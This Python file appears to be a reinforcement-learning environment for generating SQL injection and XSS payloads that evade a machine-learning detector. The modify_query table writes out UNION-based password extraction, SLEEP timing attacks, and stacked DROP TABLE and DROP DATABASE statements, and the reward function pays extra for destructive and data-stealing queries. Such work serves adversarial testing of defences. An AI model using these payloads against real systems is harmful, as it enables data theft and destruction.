import numpy as np
import pandas as pd
import random
import urllib.parse  # For URL encoding
from joblib import load
import base64


# Helper function for hex encoding
def hex_encode(input_str):
    return "".join(hex(ord(c))[2:] for c in input_str)


class SQLInjectionEnv:
    def __init__(self, model, queries):
        self.model = model
        self.queries = queries
        self.state_size = 30607  # Define the state size (length of the state vector)
        self.unique_payloads = set()
        self.actions = [
            "add OR 1=1",
            "add comment --",
            "add UNION",
            "modify quotes",
            "base",
            "add UNION SELECT",
            "add time-based sleep",
            "error-based SQLi",
            "add OR 1=1 --",
            "add OR 'a'='a'",
            "add SLEEP(5)",
            "add IF(1=1, SLEEP(5), 0) --",
            "hex encode OR 1=1",
            "URL encode UNION SELECT",
            "nested subquery SELECT FROM information_schema.tables",
            # New Actions
            "add SQL function injection (LEN, CAST)",
            "append subquery with JOIN",
            "add LIMIT clause injection",
            "insert malicious JavaScript in query",
            "hex encode UNION SELECT",
            "add NULL injection",
            "encode query in base64",
            "use blind SQLi with boolean-based logic",
            "add HAVING clause for extraction",
            "add SQL function injection (LEN, CAST)",
            "append subquery with JOIN",
            "add LIMIT clause injection",
            "insert malicious JavaScript in query",
            "hex encode UNION SELECT",
            "add NULL injection",
            "encode query in base64",
            "use blind SQLi with boolean-based logic",
            "add HAVING clause for extraction",
            "add DROP TABLE statement",
            "use time-based blind SQLi with SLEEP and AND logic",
            "add UNION with SELECT * FROM users",
            "stacked query with a second malicious statement",
            "error-based SQLi with 'AND 1=1' clause",
        ]

    def set_query(self, query):
        """Sets the user query for evaluation and resets environment state if necessary."""
        self.query = query

    def check_bypass(self, query):
        """Check if the query passes the security check"""

        prediction = self.model.predict([query])[0]
        return prediction

    def get_reward(self, query):
        """Return reward for a given query"""
        if self.check_bypass(query):
            reward = 4  # Successful bypass
        else:
            reward = -1  # Failed bypass
        # Reward more malicious and complex queries

        if "DROP" in query or "SLEEP" in query or "UNION SELECT" in query:
            reward += 2  # Increase reward for highly malicious actions

        # Additional reward for extracting data
        if "password" in query or "users" in query:
            reward += 3  # Directly rewarding data extraction

        # Penalize for overuse of certain actions (e.g., multiple time-based SLEEP injections)
        if "SLEEP" in query and query in self.unique_payloads:
            reward -= 1  # Reduce reward for repetitive attacks
        if query not in self.unique_payloads:
            reward += 0.1  # Diversity bonus for unique payloads
            self.unique_payloads.add(query)
        return reward

    def modify_query(self, query, action):
        """Modify the query based on the selected action"""
        modifications = {
            0: query + " OR 1=1",
            1: query + " --",
            2: query + " UNION SELECT *",
            3: query.replace("'", '"'),
            4: query,
            5: query + " UNION SELECT * FROM information_schema.tables",
            6: query + " AND SLEEP(5)",
            7: query + " AND 1=CONVERT(int, (SELECT @@version))",
            8: query + " OR 1=1 --",
            9: query + " OR 'a'='a'",
            10: query + " AND SLEEP(5)",
            11: query + " AND IF(1=1, SLEEP(5), 0) --",
            12: query + " OR " + hex_encode("1=1"),
            13: query + " " + urllib.parse.quote("UNION SELECT *"),
            14: query
            + " UNION SELECT column_name FROM (SELECT * FROM information_schema.tables) AS sub",
            # New modifications
            15: query + " AND LEN(database()) > 0",  # SQL function injection
            16: query + " JOIN users ON 1=1",  # Subquery with JOIN
            17: query + " LIMIT 1; DROP TABLE users;",  # LIMIT clause injection
            18: query + " <script>alert(1)</script>",  # Inject JavaScript
            19: query + " UNION SELECT NULL",  # NULL injection
            20: query + " " + str(base64.b64encode(query.encode())),  # Base64 encoding
            21: query + " AND 1=1 AND '1'='1'",  # Blind SQLi
            22: query + " HAVING 1=1 --",  # HAVING clause
            23: query
            + " AND LEN(database()) > 0",  # SQL function injection (e.g., LEN, CAST)
            24: query + " JOIN users ON 1=1",  # Subquery with JOIN
            25: query + " LIMIT 1; DROP TABLE users;",  # Limit clause and DROP TABLE
            26: query + " <script>alert(1)</script>",  # XSS injection (JavaScript)
            27: query + " UNION SELECT NULL",  # NULL injection
            28: query + " " + str(base64.b64encode(query.encode())),  # Base64 encoding
            29: query
            + " AND 1=1 AND '1'='1'",  # Blind SQL injection with boolean-based logic
            30: query + " HAVING 1=1 --",  # HAVING clause to extract data
            31: query
            + " UNION SELECT password FROM users WHERE username='admin'",  # More direct extraction attack
            32: query + " ; DROP DATABASE test;",  # Dangerous DROP query
        }
        return modifications.get(action, query)

    def reset(self):
        """Resets the environment to an initial state."""
        self.query_index = np.random.randint(
            0, len(self.queries)
        )  # Random initial query
        self.query = self.queries[self.query_index]  # Set the query
        state_vector = np.zeros(self.state_size)
        state_vector[self.query_index] = 1  # One-hot encode the state
        return state_vector

    # def step(self, action):
    #     """Simulate the action in the environment and return the next state and reward"""
    #     response = np.random.choice([1, 2, 3, 4, 0, -1])  # Simulate response
    #     reward = 1 if response == 3 else 0
    #     terminated = response == 3  # If response is 3, we consider the episode as done
    #     debug_msg = f"Action: {action}, Response: {response}"

    #     # Get the next state by randomly selecting a query index
    #     next_state = random.randint(0, len(self.queries) - 1)
    #     next_state_vector = np.zeros(self.state_size)
    #     next_state_vector[next_state] = 1  # One-hot encoding for the next state

    #     return next_state_vector, reward, terminated, debug_msg
    def step(self, action):
        """Simulate the action in the environment and return the next state and reward"""
        if not hasattr(self, "query") or self.query is None:
            raise AttributeError(
                "The query has not been set. Call set_query() before step()."
            )

        # Modify the query using the selected action
        modified_query = self.modify_query(self.query, action)

        # Calculate reward using the get_reward function
        reward = self.get_reward(modified_query)

        # Simulate response based on the current reward (or other conditions)
        terminated = reward > 3  # If reward > 0, consider the episode as done

        # Get the next state by randomly selecting a query index
        next_state = random.randint(0, len(self.queries) - 1)
        next_state_vector = np.zeros(self.state_size)
        next_state_vector[next_state] = 1  # One-hot encoding for the next state

        # Debug message for tracing
        debug_msg = (
            f"Action: {action}, Modified Query: {modified_query}, Reward: {reward}"
        )

        return next_state_vector, reward, terminated, debug_msg
